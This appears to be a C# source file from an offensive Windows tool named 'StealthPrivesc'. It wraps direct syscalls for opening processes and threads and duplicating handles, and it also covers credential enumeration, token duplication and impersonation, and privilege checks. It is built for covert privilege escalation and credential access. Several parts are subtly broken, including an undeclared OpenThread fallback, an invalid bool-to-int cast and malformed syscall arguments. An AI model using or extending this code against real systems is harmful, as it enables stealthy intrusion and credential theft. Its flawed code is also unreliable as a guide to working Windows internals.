using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using Microsoft.Win32.SafeHandles;

namespace StealthPrivesc {
    // Loud-API wrappers over NativeSyscall. Every failure surfaces as a typed exception.
    public static class NativeCalls {
        [DllImport("kernel32.dll", SetLastError = true)] static extern IntPtr OpenProcess(uint access, bool inherit, uint pid);
        [DllImport("kernel32.dll")] static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32.dll")] static extern IntPtr GetCurrentThread();
        [DllImport("kernel32.dll")] static extern bool CloseHandle(IntPtr handle);
        [DllImport("kernel32.dll")] static extern uint GetProcessId(IntPtr process);
        [DllImport("kernel32.dll")] static extern uint GetProcessIdOfThread(IntPtr thread);
        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)] static extern bool CredEnumerate(string filter, uint flags, out uint count, out IntPtr buffer);
        [DllImport("advapi32.dll")] static extern void CredFree(IntPtr buffer);
        [DllImport("advapi32.dll", SetLastError = true)] static extern bool OpenProcessToken(IntPtr process, uint access, out IntPtr token);
        [DllImport("advapi32.dll", SetLastError = true)] static extern bool OpenThreadToken(IntPtr thread, uint access, bool self, out IntPtr token);
        [DllImport("advapi32.dll", SetLastError = true)] static extern bool DuplicateToken(IntPtr source, uint desired, out IntPtr duplicate);
        [DllImport("advapi32.dll", SetLastError = true)] static extern bool ImpersonateLoggedOnUser(IntPtr process);
        [DllImport("advapi32.dll", SetLastError = true)] static extern bool RevertToSelf();
        [DllImport("advapi32.dll", SetLastError = true)] static extern bool GetTokenInformation(IntPtr token, uint cls, IntPtr buffer, uint len, out uint needed);
        [DllImport("advapi32.dll", SetLastError = true)] static extern bool CheckTokenMembership(IntPtr token, IntPtr sid, IntPtr group, out bool member);
        [DllImport("kernel32.dll")] static extern IntPtr LocalFree(IntPtr pointer);
        internal static IntPtr ToPtr(ulong value) { return new IntPtr(value); }
        internal static ulong FromPtr(IntPtr value) { return unchecked((ulong)value.ToInt64()); }
        internal static IntPtr OpenProcess(uint pid, uint access) {
            IntPtr memory = NativeSyscall.Attrs;
            IntPtr name = Marshal.StringToHGlobalUni("\\\\" + pid.ToString(System.Globalization.CultureInfo.InvariantCulture));
            IntPtr text = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(NativeObjects.UnicodeString)));
            var unicode = new NativeObjects.UnicodeString { Length = (ushort)((pid.ToString(System.Globalization.CultureInfo.InvariantCulture).Length) * 2), MaximumLength = (ushort)((pid.ToString(System.Globalization.CultureInfo.InvariantCulture).Length + 1) * 2), Buffer = name };
            Marshal.StructureToPtr(unicode, text, false);
            Marshal.WriteIntPtr(memory, 16, text);
            uint number = 0;
            int status;
            try {
                number = NativeSyscall.Number("NtOpenProcess", ref number);
                IntPtr slot = Marshal.AllocHGlobal(8);
                try {
                    status = NativeSyscall.Call((uint)number, 0x1FFFFFUL, FromPtr(text), 0, 0, 0, 0, 0);
                    if (status != 0) { throw new Win32Exception((int)unchecked((uint)status)); }
                    return new IntPtr(Marshal.ReadInt64(memory + 8));
                } finally { Marshal.FreeHGlobal(slot); }
            } catch (Win32Exception) {
                throw;
            } catch (Exception) {
                IntPtr fallback = OpenProcess(access, false, pid);
                if (fallback == IntPtr.Zero) { throw new Win32Exception(Marshal.GetLastWin32Error()); }
                return fallback;
            } finally {
                Marshal.FreeHGlobal(name); Marshal.FreeHGlobal(text); Marshal.FreeHGlobal(memory);
            }
        }
        internal static IntPtr OpenThread(uint tid, uint access) {
            IntPtr memory = NativeSyscall.Attrs;
            string text = "\\\\" + tid.ToString(System.Globalization.CultureInfo.InvariantCulture);
            IntPtr name = Marshal.StringToHGlobalUni(text);
            IntPtr unistr = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(NativeObjects.UnicodeString)));
            Marshal.StructureToPtr(new NativeObjects.UnicodeString { Length = (ushort)(text.Length * 2), MaximumLength = (ushort)((text.Length + 1) * 2), Buffer = name }, unistr, false);
            Marshal.WriteIntPtr(memory, 16, unistr);
            uint number = 0;
            try {
                number = NativeSyscall.Number("NtOpenThread", ref number);
                int status = NativeSyscall.Call((uint)number, 0x1FFFFFUL, FromPtr(unistr), 0, 0, 0, 0, 0);
                if (status != 0) { throw new Win32Exception((int)unchecked((uint)status)); }
                return new IntPtr(Marshal.ReadInt64(memory + 8));
            } catch (Win32Exception) { throw; }
            catch (Exception) {
                IntPtr fallback = OpenThread(access, false, tid);
                if (fallback == IntPtr.Zero) { throw new Win32Exception(Marshal.GetLastWin32Error()); }
                return fallback;
            } finally { Marshal.FreeHGlobal(name); Marshal.FreeHGlobal(unistr); Marshal.FreeHGlobal(memory); }
        }
        internal static IntPtr Duplicate(IntPtr source, IntPtr handle, IntPtr target, uint access, bool inherit, uint options) {
            uint number = 0;
            IntPtr slot = Marshal.AllocHGlobal(8);
            try {
                number = NativeSyscall.Number("NtDuplicateObject", ref number);
                int status = NativeSyscall.Call((uint)number, FromPtr(source), FromPtr(handle), FromPtr(target), 0, access, (ulong)(inherit ? 1 : 0), FromPtr(slot));
                if (status != 0) { throw new Win32Exception((int)unchecked((uint)status)); }
                return new IntPtr(Marshal.ReadInt64(slot));
            } finally { Marshal.FreeHGlobal(slot); }
        }
        internal static uint SystemInfo(int kind, IntPtr buffer, uint size, out int needed) {
            uint number = 0;
            IntPtr slot = Marshal.AllocHGlobal(4);
            try {
                number = NativeSyscall.Number("NtQuerySystemInformation", ref number);
                int status = NativeSyscall.Call((uint)number, (uint)kind, FromPtr(buffer), size, FromPtr(slot), 0, 0, 0);
                needed = Marshal.ReadInt32(slot);
                return unchecked((uint)status);
            } finally { Marshal.FreeHGlobal(slot); }
        }
        internal static uint QueryObject(IntPtr handle, int kind, IntPtr buffer, uint size, out int needed) {
            uint number = 0;
            IntPtr slot = Marshal.AllocHGlobal(4);
            try {
                number = NativeSyscall.Number("NtQueryObject", ref number);
                int status = NativeSyscall.Call((uint)number, FromPtr(handle), (uint)kind, FromPtr(buffer), size, FromPtr(slot), 0, 0);
                needed = Marshal.ReadInt32(slot);
                return unchecked((uint)status);
            } finally { Marshal.FreeHGlobal(slot); }
        }
        internal static void CredEnum(string filter, out IntPtr buffer, out int count) {
            uint count32;
            IntPtr pointer;
            if (!CredEnumerate(filter, 0, out count32, out pointer)) {
                int error = Marshal.GetLastWin32Error();
                count = -1; buffer = IntPtr.Zero;
                if (error != 1168) { throw new Win32Exception(error); }
                return;
            }
            count = count32; buffer = pointer;
        }
        internal static void CredEnumFree(IntPtr buffer) { if (buffer != IntPtr.Zero) { CredFree(buffer); } }
        internal static IntPtr ProcessToken(IntPtr process, uint access) {
            IntPtr token;
            if (!OpenProcessToken(process, access, out token)) { throw new Win32Exception(Marshal.GetLastWin32Error()); }
            return token;
        }
        internal static IntPtr ThreadToken(IntPtr thread, uint access, bool self) {
            IntPtr token;
            if (!OpenThreadToken(thread, access, self, out token)) { throw new Win32Exception(Marshal.GetLastWin32Error()); }
            return token;
        }
        internal static IntPtr TokenCopy(IntPtr source, uint desired) {
            IntPtr token;
            if (!DuplicateToken(source, desired, out token)) { throw new Win32Exception(Marshal.GetLastWin32Error()); }
            return token;
        }
        internal static bool TokenHasPrivilege(IntPtr token, uint index) {
            IntPtr slot = Marshal.AllocHGlobal(64);
            try {
                uint needed;
                int status = (int)GetTokenInformation(token, 2, IntPtr.Zero, 0, out needed);
                if (needed == 0 || needed > 0x1000) { throw new Win32Exception(Marshal.GetLastWin32Error()); }
                if (!GetTokenInformation(token, 2, slot, needed, out needed)) { throw new Win32Exception(Marshal.GetLastWin32Error()); }
                int count = Marshal.ReadInt32(slot, 4);
                if (count < 0 || count > 0x100) { throw new Win32Exception(0xC000000D); }
                IntPtr entries = IntPtr.Add(slot, IntPtr.Size);
                for (int i = 0; i < count; i++) {
                    IntPtr entry = IntPtr.Add(entries, (i * 16));
                    uint priv = (uint)Marshal.ReadInt32(entry, 8);
                    if ((priv & index) == index) { return true; }
                }
                return false;
            } finally { Marshal.FreeHGlobal(slot); }
        }
        internal static void FreeHandle(IntPtr handle) { if (handle != IntPtr.Zero) { CloseHandle(handle); } }
    }
}
